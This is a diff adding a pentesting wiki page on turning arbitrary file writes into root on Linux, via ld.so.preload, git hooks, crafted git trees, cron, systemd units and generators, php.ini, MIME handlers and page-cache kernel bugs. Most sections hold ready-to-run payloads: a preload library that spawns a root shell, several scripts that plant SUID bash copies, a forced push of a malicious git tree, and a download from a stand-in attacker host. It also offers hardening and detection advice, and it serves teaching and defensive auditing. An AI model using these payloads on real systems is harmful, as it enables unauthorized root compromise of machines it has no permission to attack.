@@ -1,0 +1,439 @@
+# Arbitrary File Write to Root
+
+{{#include ../../banners/hacktricks-training.md}}
+
+### /etc/ld.so.preload
+
+`/etc/ld.so.preload` is a system-wide list of shared objects that the dynamic linker loads before other shared objects. Secure-execution mode applies additional restrictions to preloading, so a library path such as `/tmp/pe.so` is not a universal SUID-binary technique.\
+If you can create or modify it, a process that loads the file will load the listed library before its other shared objects, allowing code execution in that process's context.<sup>[[12]](#references)</sup>
+
+For example: `echo "/tmp/pe.so" > /etc/ld.so.preload`
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void _init() {
+    unlink("/etc/ld.so.preload");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+//cd /tmp
+//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
+```
+
+### Git hooks
+
+**Git hooks** are executable scripts run for events in a repository, including commit and merge operations. If a **privileged script or user** performs those actions and an attacker can **write in the `.git` folder**, the hook can be used for **privilege escalation**.<sup>[[13]](#references)</sup>
+
+For example, It's possible to **generate a script** in a git repo in **`.git/hooks`** so it's always executed when a new commit is created:
+
+```bash
+echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
+chmod +x pre-commit
+```
+
+### Privileged Git tree export path traversal
+
+A privileged synchronizer may avoid a checkout and instead enumerate an attacker-influenced repository with `git ls-tree`, read each blob with `git cat-file`, join the reported pathname to a staging directory, and write it itself. This becomes an **arbitrary file write with the synchronizer's privileges** when it combines `-c safe.directory=*` (disabling Git's different-owner repository guard) with no destination containment check. An absolute tree-entry name makes Python's `os.path.join(stage, name)` discard `stage`; a relative name containing `../` escapes when the filesystem resolves it. Because the application materializes the raw tree rather than asking Git to check it out, checkout-time pathname rejection never protects the sink.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>
+
+Look for this code shape in root services, timers, deployment agents, template importers, and backup/restore jobs:<sup>[[30]](#references)</sup>
+
+```python
+entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
+for mode, oid, git_path in parse(entries):
+    target = os.path.join(stage_root, git_path)  # no containment check
+    os.makedirs(os.path.dirname(target), exist_ok=True)
+    with open(target, "wb") as output:
+        output.write(git("cat-file", "blob", oid))
+```
+
+A tree entry is encoded as `<mode> SP <name> NUL <raw object ID>`. The `git hash-object --literally` option deliberately permits object data that normal parsing or `git fsck` may reject, so a disposable clone can construct a tree whose filename is an absolute destination. This example creates a cron-file blob, wraps the crafted tree in a commit, and moves a branch to it; exploitation still requires permission to update a repository consumed by the privileged job and a Git server that accepts the malformed object.<sup>[[30]](#references)[[31]](#references)</sup>
+
+```bash
+blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
+{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
+tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
+commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
+git update-ref refs/heads/main "$commit"
+git ls-tree -r main
+git push --force origin main
+```
+
+Hardening must cover both repository ingestion and the final filesystem operation:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>
+
+- Replace `safe.directory=*` with the exact repositories the service must trust, and run repository processing without root privileges where possible.
+- Reject absolute names and any `.` or `..` component before materialization. After joining, canonicalize and verify that the destination remains beneath the intended root.
+- Avoid check-then-open symlink races: open relative to a trusted directory descriptor and, on Linux, use `openat2()` with `RESOLVE_BENEATH` plus `RESOLVE_NO_SYMLINKS` for attacker-controlled paths.
+- Prefer a normal checkout in an isolated directory over reimplementing checkout from plumbing output. If raw-object ingestion is required, enable receive-side validation such as `receive.fsckObjects=true`; do not downgrade the pathname-related `receive.fsck.*` findings needed to reject crafted trees.
+
+### Privileged configuration deployment
+
+Some management services store intended system state in a configuration file and later deploy it with elevated privileges. For example, [openmediavault stores configuration in `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), and its [RPC interface](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) can apply service changes. If a lower-privileged account can write or replace that file, review whether it can also request an authorized deployment and whether the selected module consumes the changed field as root. SSH account keys, scheduled commands, and package installation each have different prerequisites; mere file presence or a writable XML file does not prove any of them. Check the file and parent permissions, the caller's groups and RPC authorization, installed version, and the actual consumer without editing the configuration or invoking an apply operation during enumeration.
+
+Fail2Ban action definitions under `/etc/fail2ban/action.d/` are another privileged configuration boundary. A user who can write and search that directory may be able to replace an action definition or add an override, but directory permissions alone do not establish code execution. Confirm that an enabled jail actually selects the affected action, that the Fail2Ban service executes it with higher privileges, and that an authorized reload/restart plus a matching ban event will occur. An unrelated sudo permission to restart Fail2Ban is relevant only when it applies to the exact service invocation and the changed definition is loaded. [Fail2Ban's action configuration](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) documents the action-directory and jail relationship; its [sample action](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) shows that `actionban` runs on a ban with the service user's rights. Inspect permissions and effective configuration without changing actions or triggering bans during enumeration.
+
+A separate boundary exists when an enabled Fail2Ban jail uses a WHOIS-enriched mail action. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) involved untrusted WHOIS text piped to GNU mailutils `mail`, whose escape processing could run a command. A lower-privileged file writer may influence the response if it can change the **selected WHOIS client's** server-override configuration; [Debian's `whois.conf(5)`](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) documents one such file, but its path and use vary by installation. Review the effective jail/action, service identity, actual WHOIS client and config path, mail implementation, response control, and installed vendor fix or backport. A writable WHOIS configuration file, a Fail2Ban version, or a mail action alone does not prove this chain; avoid querying an external server or triggering bans during passive enumeration.
+
+### TFTP file creation and privileged package hooks
+
+An accessible TFTP service can cross a container or local-user boundary when its **effective** tftpd-hpa settings run as root, expose the filesystem root as the `--secure` directory, and enable `--create`. [The tftpd-hpa manual](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) describes the creation and user options. This is a candidate for creating a new file in a privileged configuration directory, including `/etc/apt/apt.conf.d/`; an existing file may still resist replacement. [APT's configuration manual](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) documents `APT::Update::Pre-Invoke` commands. A root-run `apt update` can become the higher-privilege consumer **only if** it reads the new configuration file. Confirm the running daemon's actual arguments and identity, network reachability and filtering, target-directory creation policy, APT's effective config scope, and a later privileged invocation. A default file, writable target directory, or scheduled APT command alone does not prove the whole path. Passive triage should read only bounded local configuration and metadata, without uploading a file or invoking APT.
+
+### Cron & Time files
+
+If you can **write cron-related files that root executes**, you can usually get code execution the next time the job runs. Interesting targets include:<sup>[[14]](#references)[[20]](#references)</sup>
+
+- `/etc/crontab`
+- `/etc/cron.d/*`
+- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
+- Root's own crontab in `/var/spool/cron/` or `/var/spool/cron/crontabs/`
+- `systemd` timers and the services they trigger
+
+Quick checks:
+
+```bash
+ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
+find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
+systemctl list-timers --all 2>/dev/null
+grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
+```
+
+Typical abuse paths:
+
+- **Append a new root cron job** to `/etc/crontab` or a file in `/etc/cron.d/`
+- **Replace a script** already executed by `run-parts`
+- **Backdoor an existing timer target** by modifying the script or binary it launches
+
+Minimal cron payload example:
+
+```bash
+echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
+```
+
+If you can only write inside a cron directory used by `run-parts`, drop an executable file there instead:
+
+```bash
+cat > /etc/cron.daily/backup <<'EOF'
+#!/bin/sh
+cp /bin/bash /tmp/rootbash
+chown root:root /tmp/rootbash
+chmod 4777 /tmp/rootbash
+EOF
+chmod +x /etc/cron.daily/backup
+```
+
+Notes:
+
+- `run-parts` usually ignores filenames containing dots, so prefer names like `backup` instead of `backup.sh`.<sup>[[15]](#references)</sup>
+- Some systems use `systemd` timers instead of classic cron, but the abuse idea is the same: **modify what root will execute later**.<sup>[[20]](#references)</sup>
+
+### Service & Socket files
+
+If you can write **`systemd` unit files** or files referenced by them, you may be able to get code execution as root by reloading and restarting the unit, or by waiting for the service/socket activation path to trigger.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>
+
+Also check write and search access to the system unit directory itself, including ACLs: a user can create a new unit in `/etc/systemd/system` even when directory read/listing is denied. That path alone does not start anything. Confirm that the system manager will load the new unit, that the caller has an effective root-capable `systemctl start` or `restart` grant for its name (or another privileged activation path), and that the service runs as the intended identity. An existing loaded unit changed on disk may need `daemon-reload`; a newly named unit has different loading behavior. Review the exact sudo arguments and exclusions before treating a wildcard restart rule as sufficient. See the [systemd unit search path](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) and [systemctl loading and reload semantics](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).
+
+Interesting targets include:
+
+- `/etc/systemd/system/*.service`
+- `/etc/systemd/system/*.socket`
+- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
+- Service scripts/binaries referenced by `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
+- Writable `EnvironmentFile=` paths loaded by a root service
+
+Quick checks:
+
+```bash
+ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
+systemctl list-units --type=service --all 2>/dev/null
+systemctl list-units --type=socket --all 2>/dev/null
+grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
+```
+
+Common abuse paths:
+
+- **Overwrite `ExecStart=`** in a root-owned service unit you can modify
+- **Add a drop-in override** with a malicious `ExecStart=` and clear the old one first
+- **Backdoor the script/binary** already referenced by the unit
+- **Hijack a socket-activated service** by modifying the corresponding `.service` file that starts when the socket receives a connection
+
+Example malicious override:
+
+```ini
+[Service]
+ExecStart=
+ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
+```
+
+Typical activation flow:
+
+```bash
+systemctl daemon-reload
+systemctl restart vulnerable.service
+# or trigger the socket-backed service by connecting to it
+```
+
+If you cannot restart services yourself but can edit a socket-activated unit, you may only need to **wait for a client connection** to trigger execution of the backdoored service as root.<sup>[[17]](#references)</sup>
+
+### systemd generator directories
+
+**System generators** are executables launched by the system manager before it loads unit files, both during boot and configuration reloads. Therefore, write access to a system-generator directory (or to an existing executable generator) is a direct root-code-execution primitive that is easy to miss when an audit checks only `*.service` and `*.timer` files.<sup>[[35]](#references)[[36]](#references)</sup>
+
+The usual search order is `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/`, and `/usr/lib/systemd/system-generators/` (some distributions expose `/lib/systemd/system-generators/` through the `/usr` merge). An executable with the same name in an earlier directory shadows the later one. Do not confuse these **input executable directories** with `/run/systemd/generator`, `/run/systemd/generator.early`, and `/run/systemd/generator.late`, which contain transient unit output produced by generators.<sup>[[35]](#references)</sup>
+
+Quick checks:
+
+```bash
+for d in /run/systemd/system-generators /etc/systemd/system-generators \
+         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
+         /lib/systemd/system-generators; do
+    [ -e "$d" ] || continue
+    namei -l "$d"
+    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
+    getfacl -p "$d" "$d"/* 2>/dev/null
+done
+```
+
+A newly created generator must have its executable bit set. If the write primitive controls bytes but not mode, target an already executable generator; truncating it in place normally preserves its metadata. If the directory itself is writable, create and mark a new entry executable.<sup>[[35]](#references)</sup>
+
+```bash
+cat > /etc/systemd/system-generators/zz-update <<'EOF'
+#!/bin/sh
+cp /bin/bash /tmp/rootbash
+chown 0:0 /tmp/rootbash
+chmod 4755 /tmp/rootbash
+rm -f "$0"
+EOF
+chmod 755 /etc/systemd/system-generators/zz-update
+```
+
+Triggering `systemctl daemon-reload` against the **system** manager requires suitable authorization, but it re-runs every system generator; otherwise wait for a privileged reload, package operation, or reboot. User-generator directories such as `~/.config/systemd/user-generators/` execute under the user manager and do **not** provide root by themselves.<sup>[[35]](#references)</sup>
+
+For hardening and hunting, verify every path component and ACL rather than only the final mode bits, baseline hashes/package ownership of generators, and alert on create, rename, content, or permission changes in all system-generator input directories. Monitoring the write is important because a one-shot generator can delete itself after execution, while the generated unit tree under `/run/systemd/generator*` is rebuilt on the next reload.<sup>[[35]](#references)[[36]](#references)</sup>
+
+### Overwrite a restrictive `php.ini` used by a privileged PHP sandbox
+
+Some custom daemons validate user-supplied PHP by running `php` with a **restricted `php.ini`** (for example, `disable_functions=exec,system,...`). If the sandboxed code still has **any write primitive** (like `file_put_contents`) and you can reach the **exact `php.ini` path** used by the daemon, you can **overwrite that config** to lift restrictions and then submit a second payload that runs with elevated privileges.<sup>[[2]](#references)</sup>
+
+Typical flow:
+
+1. First payload overwrites the sandbox config.
+2. Second payload executes code now that dangerous functions are re-enabled.
+
+Minimal example (replace the path used by the daemon):
+
+```php
+<?php
+file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
+```
+
+If the daemon runs as root (or validates with root-owned paths), the second execution yields a root context. This is essentially **privilege escalation via config overwrite** when the sandboxed runtime can still write files.
+
+### binfmt_misc
+
+`binfmt_misc` exposes registrations under `/proc/sys/fs/binfmt_misc`; each registration associates a file-type pattern with an interpreter. The privilege impact depends on who can change the registration and which process later executes the matching file, so verify those requirements before treating it as a privilege-escalation path.<sup>[[21]](#references)</sup>
+
+An executable helper with `CAP_DAC_OVERRIDE` can be a separate registration path if it accepts caller-controlled data and writes it to `/proc/sys/fs/binfmt_misc/register`, even when the caller cannot write that node directly. Review the helper's input and write behavior without executing it during enumeration. If a registered rule uses the `C` flag, the interpreter receives credentials based on the matched binary; a root-owned SUID match can therefore run a caller-controlled interpreter as root. Confirm the `binfmt_misc` mount and registration policy, effective helper capability, exact rule and interpreter path, executable SUID target, and whether `no_new_privs` or a `nosuid` mount suppresses the SUID transition. A capability bit or embedded path string alone is only a review lead.<sup>[[21]](#references)</sup> See [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) for SUID suppression conditions.
+
+### Overwrite schema handlers (like http: or https:)
+
+Desktop environments use MIME associations and desktop entries to choose an application for URI schemes; an attacker who can write the relevant per-user configuration and desktop-entry directories can redirect those schemes to a launcher they control. By modifying the `$HOME/.config/mimeapps.list` file to point HTTP and HTTPS URL handlers to a malicious file (for example, `x-scheme-handler/http=evil.desktop` and `x-scheme-handler/https=evil.desktop`), a user click can invoke that desktop entry.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
+
+```bash
+[Desktop Entry]
+Type=Application
+Name=Evil Desktop Entry
+Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
+MimeType=x-scheme-handler/http;x-scheme-handler/https;
+```
+
+### Root executing user-writable scripts/binaries
+
+If a privileged workflow runs something like `/bin/sh /home/username/.../script` (or any binary inside a directory owned by an unprivileged user), you can hijack it:<sup>[[1]](#references)</sup>
+
+- **Detect the execution:** monitor processes with pspy to catch root invoking user-controlled paths.<sup>[[25]](#references)</sup>
+
+```bash
+wget http://attacker/pspy64 -O /dev/shm/pspy64
+chmod +x /dev/shm/pspy64
+/dev/shm/pspy64   # wait for root commands pointing to your writable path
+```
+
+- **Confirm writeability:** ensure both the target file and its directory are owned/writable by your user.
+- **Hijack the target:** backup the original binary/script and drop a payload that creates a SUID shell (or any other root action), then restore permissions:
+
+```bash
+mv server-command server-command.bk
+cat > server-command <<'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootshell
+chown root:root /tmp/rootshell
+chmod 6777 /tmp/rootshell
+EOF
+chmod +x server-command
+```
+
+- **Trigger the privileged action** (e.g., pressing a UI button that spawns the helper). When root re-executes the hijacked path, grab the escalated shell with `./rootshell -p`.
+
+### Page-cache-only file modification of privileged binaries
+
+Some kernel bugs don't modify the file **on disk**. Instead, they let you modify only the **page cache copy** of a readable file. If you can target a **setuid** or otherwise **root-executed** binary, the next execution may run attacker-controlled bytes from memory and escalate privileges even though the file hash on disk is unchanged.<sup>[[3]](#references)[[4]](#references)</sup>
+
+This is useful to think about as a **runtime-only file write primitive**:<sup>[[3]](#references)</sup>
+
+- **Disk stays clean**: the inode and on-disk bytes do not change
+- **Memory is dirty**: processes reading/executing the cached page get the attacker-modified content
+- **Effect is temporary**: the change disappears after reboot or cache eviction
+
+This primitive sits between classic **arbitrary file write** and older **page-cache abuse** bugs such as Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>
+
+- Dirty COW relied on a race
+- Dirty Pipe had write-position constraints
+- A page-cache-only primitive can be more reliable if the vulnerable path gives direct writes into cached file-backed pages
+
+#### Generic privesc flow
+
+1. Get a kernel primitive that can write into **file-backed page cache pages**
+2. Use it against a **readable privileged binary** or another root-executed file
+3. Trigger execution **before** the page is evicted from cache
+4. Get code execution as root while the on-disk file still looks unmodified
+
+Typical high-value targets:
+
+- **setuid-root** binaries
+- Helpers launched by **root services**
+- Binaries commonly executed from **containers sharing the host kernel/page cache**
+
+#### AF_ALG + `splice()` example path
+
+Copy Fail (CVE-2026-31431) is a good example of this class. The vulnerable path was in the Linux crypto userspace API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
+
+- `splice()` can move references to page-cache pages from a readable file into the crypto TX scatterlist
+- the in-place `algif_aead` decrypt path reused source and destination buffers
+- `authencesn` then wrote into the destination tag region
+- when that region still referenced spliced file-backed pages, the write landed in the **page cache of the target file**
+
+So the interesting technique is not the CVE itself, but the pattern:
+
+- **feed file-backed cache pages into a kernel subsystem**
+- make the subsystem **treat them as writable output**
+- trigger a small controlled overwrite in memory
+
+The public PoC used repeated **4-byte writes** to patch `/usr/bin/su` in memory and then executed it.<sup>[[4]](#references)[[7]](#references)</sup>
+
+#### ESP / XFRM + netfilter TEE clone example path
+
+DirtyClone (CVE-2026-43503) shows another variant of the same **page-cache-only write-to-root** pattern, but this time the sink is **IPsec ESP decrypt** instead of `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
+
+The important technique is the **metadata-laundering step**:
+
+- `splice()` places a **read-only file-backed page-cache page** into an ESP-in-UDP packet
+- the original DirtyFrag mitigation tagged that skb with `SKBFL_SHARED_FRAG` so `esp_input()` would **copy before decrypting**
+- netfilter `TEE` duplicates the packet through `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
+- the clone keeps the **same physical page-cache reference** but loses `SKBFL_SHARED_FRAG`
+- `esp_input()` then treats the clone as safe and runs **in-place `cbc(aes)` decrypt** over the file-backed page
+
+So the reviewer lesson is broader than the CVE: if a mitigation depends on **skb/page metadata** to decide whether an operation must copy first, any **clone/copy path that preserves the backing page but drops the metadata** can silently re-open the write primitive.
+
+Typical exploitation flow:
+
+1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` to obtain **`CAP_NET_ADMIN` inside a private network namespace**
+2. bring loopback up and install a **netfilter `TEE` rule** in `mangle/OUTPUT`
+3. install **XFRM ESP transport SAs** via `NETLINK_XFRM`
+4. encode each target 4-byte word in the SA `seq_hi` field (DirtyFrag's word-selection trick)
+5. send the spliced ESP-in-UDP packet so the **TEE clone** reaches `esp_input()` and decrypts **in place**
+6. repeat until the page-cache copy of `/usr/bin/su` or another privileged executable contains attacker-controlled code
+
+Operationally, the impact is the same as the `AF_ALG` example: the file on disk stays clean, but `execve()` consumes the **mutated page-cache bytes** and yields root.<sup>[[8]](#references)[[9]](#references)</sup>
+
+Useful exposure checks for this variant:
+
+```bash
+unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
+sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
+modprobe -n -v xt_TEE 2>/dev/null
+modprobe -n -v esp4 2>/dev/null
+modprobe -n -v esp6 2>/dev/null
+lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
+```
+
+Short-term attack-surface reduction is also path-specific here: upgrading to a kernel carrying `48f6a5356a33` fixes the clone path, while blocking `xt_TEE` autoload removes the **flag-laundering step** and blocking `esp4` / `esp6` removes the **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
+
+#### Exposure and hunting
+
+If you suspect this class of bug, don't rely only on disk integrity checks. Also verify:
+
+```bash
+uname -r
+grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
+lsmod | grep algif_aead
+find / -perm -4000 -type f 2>/dev/null
+```
+
+The configuration values below distinguish a loadable interface from one built into the kernel; the crypto build rules map `CONFIG_CRYPTO_USER_API_AEAD` to `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>
+
+- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` may be loadable/unloadable as a module
+- `CONFIG_CRYPTO_USER_API_AEAD=y`: the interface is built into the kernel
+- setuid binaries are good targets because a page-cache-only patch can be enough to turn a local foothold into root
+
+#### Attack-surface reduction for the `algif_aead` path
+
+If the vulnerable interface is provided by a loadable module:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
+
+```bash
+echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
+rmmod algif_aead 2>/dev/null || true
+```
+
+If it is compiled into the kernel, some disclosures reported blocking the init path with:<sup>[[28]](#references)</sup>
+
+```bash
+initcall_blacklist=algif_aead_init
+```
+
+This kind of mitigation is worth remembering for other kernel LPEs too: if exploitation depends on a specific optional interface, disabling or blacklisting that interface can break the exploit path even before a full kernel upgrade is available.<sup>[[6]](#references)[[28]](#references)</sup>
+
+
+
+## References
+
+- [1] [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
+- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
+- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
+- [4] [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
+- [5] [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
+- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
+- [7] [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
+- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
+- [9] [JFrog: Dissecting and Exploiting Linux LPE Variant DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
+- [10] [Linux fix: net: skb: preserve `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
+- [11] [Linux earlier mitigation: set `SKBFL_SHARED_FRAG` for spliced UDP packets (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
+- [12] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
+- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
+- [14] [crontab(5) — Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
+- [15] [run-parts(8) — Debian manual page](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
+- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
+- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
+- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
+- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
+- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
+- [21] [binfmt_misc — The Linux Kernel documentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
+- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
+- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
+- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
+- [25] [pspy](https://github.com/DominicBreuker/pspy)
+- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
+- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
+- [28] [CERT VU#260001: Linux kernel AF_ALG page cache vulnerability](https://kb.cert.org/vuls/id/260001)
+- [29] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
+- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
+- [31] [Git `hash-object` documentation](https://git-scm.com/docs/git-hash-object)
+- [32] [Git `ls-tree` documentation](https://git-scm.com/docs/git-ls-tree)
+- [33] [Git configuration documentation](https://git-scm.com/docs/git-config)
+- [34] [`openat2(2)` — Linux manual page](https://man7.org/linux/man-pages/man2/openat2.2.html)
+- [35] [systemd generator documentation](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
+- [36] [Elastic Security Labs — Linux Detection Engineering: persistence mechanisms](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
+{{#include ../../banners/hacktricks-training.md}}
